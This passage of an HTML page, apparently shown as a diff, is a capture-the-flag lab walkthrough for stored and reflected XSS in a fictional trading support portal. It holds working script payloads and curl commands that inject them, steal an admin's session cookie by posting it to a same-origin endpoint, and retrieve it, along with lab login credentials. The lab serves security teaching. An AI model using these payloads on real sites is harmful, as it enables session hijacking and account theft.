+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>If the text appears bold or as a heading in the dashboard, the application renders HTML from user input.</p>
+<h3 id="script-injection-payloads">Script Injection Payloads</h3>
+<p>Once HTML injection is confirmed, escalate to JavaScript:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="same-origin-cookie-exfiltration">Same-Origin Cookie Exfiltration</h3>
+<p>To send the cookie to the same-origin sink so you can read it back:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/steal&#39;</span><span class="p">,{</span><span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span><span class="nx">body</span><span class="o">:</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">cookie</span><span class="o">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">,</span><span class="nx">url</span><span class="o">:</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">})})&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>The script reads <code>document.cookie</code> and posts it as JSON to <code>/api/steal</code> on the same origin. The server stores the value, and you retrieve it from <code>/api/stolen</code>.</p>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h3>
+<p>Open the platform in your browser and start the exercise environment.</p>
+<ul>
+<li>Navigate to <strong>Exercises</strong> and locate the CapitalFlow Markets track</li>
+<li>Find <strong>Cross-Site Scripting</strong> and click <strong>Launch</strong></li>
+<li>Wait for the status to change to <strong>Running</strong></li>
+<li>Note the <strong>target IP</strong> displayed in the Active Lab View</li>
+</ul>
+<h3 id="step-2-add-the-target-to-etchosts">Step 2: Add the Target to /etc/hosts</h3>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Add capitalflow-support.lab to /etc/hosts</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;target_ip&gt; capitalflow-support.lab&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+</div>
+<p>Replace <code>&lt;target_ip&gt;</code> with the IP shown in the Active Lab View.</p>
+<h3 id="step-3-authenticate-and-explore-the-support-platform">Step 3: Authenticate and Explore the Support Platform</h3>
+<p>Log in as the trader and save the session cookie, then load the support page.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Log in and save the session cookie</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;email=trader@capitalflow.com&amp;password=Trader2024#&quot;</span><span class="w"> </span>http://capitalflow-support.lab/login<span class="w"> </span>-L
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Access the support feedback page</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>http://capitalflow-support.lab/support
+</code></pre></div>
+</div>
+<p>Read the page HTML to understand the feedback form structure. The form posts to <code>/support/submit</code> with the field names <code>subject</code>, <code>message</code>, and <code>priority</code>. You need these details to submit payloads via curl.</p>
+<figure>
+<p><img alt="CapitalFlow Support feedback form with subject, priority, and message fields" src="../img/cf-xss-support.png" width="820" />
+  </p>
+<figcaption>The customer support feedback form. Whatever a trader types into the subject and message fields is stored and later rendered in the admin dashboard without sanitization, which is the path a stored XSS payload rides to the admin browser.</figcaption>
+</figure>
+<h3 id="step-4-submit-feedback-with-html-tags">Step 4: Submit Feedback with HTML Tags</h3>
+<p>Start by testing whether the application sanitizes HTML input. Submit feedback containing basic HTML formatting tags.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Submit feedback with bold HTML tags</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;subject=Test Feedback&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;message=&lt;b&gt;bold test&lt;/b&gt; &lt;i&gt;italic test&lt;/i&gt;&quot;</span><span class="w"> </span>http://capitalflow-support.lab/support/submit
+</code></pre></div>
+</div>
+<p>The response is a confirmation page. The submitted feedback is now stored and rendered unsanitized on the admin dashboard at <code>/admin/feedback</code>. As a trader you cannot open that admin-only page directly, but a working script payload runs there when the simulated admin reviews the queue. If you have admin credentials from an earlier exercise, you can confirm the rendering yourself.</p>
+<div class="admonition target">
+<p class="admonition-title">Optional - Confirm rendering as admin</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/cf-admin-cookies.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;email=admin@capitalflow.com&amp;password=AdminSecure2024#&quot;</span><span class="w"> </span>http://capitalflow-support.lab/login<span class="w"> </span>-L
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-admin-cookies.txt<span class="w"> </span>http://capitalflow-support.lab/admin/feedback<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;bold test&quot;</span>
+</code></pre></div>
+</div>
+<p>If the output contains <code>&lt;b&gt;bold test&lt;/b&gt;</code> with the actual HTML tags (not escaped as <code>&amp;lt;b&amp;gt;</code>), the application stores and renders user input as HTML. The XSS vulnerability is confirmed.</p>
+<h3 id="step-5-test-script-tag-injection">Step 5: Test Script Tag Injection</h3>
+<p>Escalate from HTML to JavaScript injection. Submit feedback containing a script tag.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Submit feedback with a script tag</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;subject=Script Test&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;message=&lt;script&gt;document.title=&#39;XSS&#39;&lt;/script&gt;&quot;</span><span class="w"> </span>http://capitalflow-support.lab/support/submit
+</code></pre></div>
+</div>
+<p>When the admin dashboard renders the stored submission, any JavaScript inside the <code>&lt;script&gt;</code> tag executes in the admin's browser. Opening the page in a browser would show the page title change to "XSS" as proof of execution.</p>
+<figure>
+<p><img alt="Admin Feedback Management panel rendering a stored XSS payload in the admin browser" src="../img/cf-xss-admin-feedback.png" width="820" />
+  </p>
+<figcaption>The admin Feedback Management panel renders the stored payload as live markup: the broken-image icon in the subject shows an onerror handler fired, and the red banner in the message body confirms the injected code ran inside the administrator's session.</figcaption>
+</figure>
+<h3 id="step-6-test-for-reflected-xss-on-the-search-endpoint">Step 6: Test for Reflected XSS on the Search Endpoint</h3>
+<p>Some applications also have reflected XSS vulnerabilities where user input from the URL is echoed back in the page without sanitization. Test the search feature, which accepts a <code>q</code> parameter.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test reflected XSS on the search endpoint</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-support.lab/search?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>
+</code></pre></div>
+</div>
+<p>Check whether the script tag appears unescaped in the response. If the search results page includes <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in the HTML, the search endpoint is vulnerable to reflected XSS as well.</p>
+<h3 id="step-7-craft-a-same-origin-cookie-theft-payload">Step 7: Craft a Same-Origin Cookie Theft Payload</h3>
+<p>Now craft a payload that steals the admin's cookie. The admin dashboard displays all submitted feedback, and the admin's <code>admin_flag</code> cookie is not protected with the <code>HttpOnly</code> flag. Because lab egress is blocked, the payload posts the cookie to the same-origin sink <code>POST /api/steal</code> instead of an external server.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Submit a stored XSS payload that exfiltrates the cookie</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;subject=Urgent Issue&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;message=&lt;script&gt;fetch(&#39;/api/steal&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/json&#39;},body:JSON.stringify({cookie:document.cookie,url:location.href})})&lt;/script&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span>http://capitalflow-support.lab/support/submit
+</code></pre></div>
+</div>
+<p>The payload reads <code>document.cookie</code> and posts it as JSON to <code>/api/steal</code>. When the simulated admin reviews the feedback queue, the script runs inside the admin's session and the admin's <code>admin_flag</code> cookie is captured server-side. Using <code>--data-urlencode</code> keeps the JSON body intact through curl.</p>
+<h3 id="step-8-retrieve-the-admin-cookie-and-flag">Step 8: Retrieve the Admin Cookie and Flag</h3>
+<p>Read the captured data back from the same-origin retrieval endpoint.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Retrieve the exfiltrated cookies</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>http://capitalflow-support.lab/api/stolen
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Filter for the flag</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-support-cookies.txt<span class="w"> </span>http://capitalflow-support.lab/api/stolen<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;OCR{[^}]*}&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>captured</code> array holds one entry from the simulated admin review with the <code>admin_flag</code> cookie. The cookie value contains the flag in <code>OCR{...}</code> format. If the array is empty, your payload did not read <code>document.cookie</code> or did not post to <code>/api/steal</code>; revise it and resubmit at <code>/support/submit</code>.</p>
+<hr />
+<h2 id="record-your-findings">Record Your Findings</h2>
+<blockquote>
+<p>Document the XSS testing and cookie theft results below.</p>
+<p><strong>HTML injection test:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Rendered as HTML?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;b&gt;bold test&lt;/b&gt;</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Script injection test:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Stored unescaped?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;script&gt;document.title='XSS'&lt;/script&gt;</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Reflected XSS test:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Vulnerable?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/search?q=</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Cookie theft results:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>(paste captured cookie data here)
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>OCR{...}
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. Why is stored XSS considered more dangerous than reflected XSS?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Stored XSS persists on the server, which means every user who views the affected page triggers the payload without any special interaction. Reflected XSS requires the victim to click a crafted link containing the payload, which means the attacker must deliver the link through phishing or social engineering. Stored XSS also affects multiple victims simultaneously, while reflected XSS typically targets one user at a time.</p>
+</details>
+<p><strong>2. The admin's <code>admin_flag</code> cookie lacked the HttpOnly flag. How does HttpOnly prevent cookie theft via XSS, and why might a developer omit it?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The <code>HttpOnly</code> flag instructs the browser to exclude the cookie from JavaScript access via <code>document.cookie</code>. Scripts injected through XSS cannot read HttpOnly cookies, which blocks the most common cookie theft technique. A developer might omit the flag when client-side JavaScript needs to read the cookie value (for example, to include a CSRF token in AJAX requests). However, session cookies and authentication tokens should always use HttpOnly because there is no legitimate reason for client-side JavaScript to access them directly.</p>
+</details>
+<p><strong>3. The payload in this lab exfiltrated to a same-origin endpoint instead of an external server. Why can same-origin exfiltration succeed where an external beacon fails, in both this lab and real environments?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The lab network blocks outbound internet traffic, so an external attacker server is unreachable and a beacon to <code>attacker.com</code> never arrives. Posting to a path on the target's own origin stays inside the lab. In real environments, the same technique evades two controls: a strict Content Security Policy that only allows requests back to the page's own origin, and egress filtering that drops traffic to unknown external hosts. Same-origin exfiltration to an endpoint the attacker can later read is a common way to defeat both.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>Stored XSS</strong> persists on the server and executes in every victim's browser that views the affected page, making it the most dangerous XSS variant</li>
+<li><strong>Cookie theft</strong> via <code>document.cookie</code> works when cookies lack the <code>HttpOnly</code> flag, allowing injected scripts to read and exfiltrate session tokens</li>
+<li><strong>Same-origin exfiltration</strong> posts stolen data to a path on the target's own origin, which works when egress is blocked or a Content Security Policy restricts outbound requests</li>
+<li><strong>Input sanitization</strong> and <strong>output encoding</strong> are complementary defenses; sanitization strips dangerous content on input, while encoding neutralizes it on output</li>
+<li><strong>The HttpOnly flag</strong> on cookies blocks JavaScript access and should be set on all session and authentication cookies</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
